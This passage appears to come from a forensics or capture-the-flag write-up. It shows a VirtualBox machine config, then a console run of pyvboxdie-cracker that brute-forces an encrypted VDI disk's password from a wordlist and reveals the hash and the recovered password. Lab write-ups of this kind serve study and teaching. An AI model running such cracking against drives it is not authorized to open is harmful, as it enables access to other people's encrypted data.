        <GuestProperty name="/VirtualBox/GuestInfo/Net/0/V4/Netmask" value="255.255.255.0" timestamp="1657117380952151104" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/Net/Count" value="1" timestamp="1657117646084736900" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/OS/Product" value="Linux" timestamp="1657117380950198400" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/OS/Release" value="5.15.0-40-generic" timestamp="1657117380950198401" flags=""/>
        <GuestProperty name="/VirtualBox/GuestInfo/OS/Version" value="#43-Ubuntu SMP Wed Jun 15 12:54:21 UTC 2022" timestamp="1657117380950198402" flags=""/>
        <GuestProperty name="/VirtualBox/HostInfo/DekMissing" value="1" timestamp="1660245560293252500" flags="RDONLYGUEST"/>
        <GuestProperty name="/VirtualBox/HostInfo/GUI/LanguageID" value="es_ES" timestamp="1660245647071532000" flags=""/>
      </GuestProperties>
    </Hardware>
    <StorageControllers>
      <StorageController name="AHCI" type="AHCI" PortCount="3" useHostIOCache="false" Bootable="true" IDE0MasterEmulationPort="0" IDE0SlaveEmulationPort="1" IDE1MasterEmulationPort="2" IDE1SlaveEmulationPort="3">
        <AttachedDevice type="HardDisk" hotpluggable="false" port="0" device="0">
          <Image uuid="{12b147da-5b2d-471f-9e32-a32b1517ff4b}"/>
        </AttachedDevice>
      </StorageController>
    </StorageControllers>
    <VideoCapture options="vc_enabled=true,ac_enabled=true,ac_profile=med" fps="25"/>
  </Machine>
</VirtualBox>
         
```
```console
└─$ python3 ~/tools/pyvboxdie-cracker/pyvboxdie-cracker.py -v 2019-08-01.vbox -d ~/tools/pyvboxdie-cracker/wordlist.txt 
Starting pyvboxdie-cracker...

[*] Encrypted drive found :  F:/2019.vdi
[*] KeyStore information...
        Algorithm = AES-XTS256-PLAIN64
        Hash = PBKDF2-SHA256
        Final Hash = 5442057bc804a3a914607decea5574aa7038cdce0d498c7fc434afe8cd5b244f

[*] Starting bruteforce...
        2 password tested...
        50 password tested...
        62 password tested...

[*] Password Found = computer
```

![image](https://user-images.githubusercontent.com/105310322/195453290-0d3c2c0a-48e2-45e5-8091-9899098f9b94.png)
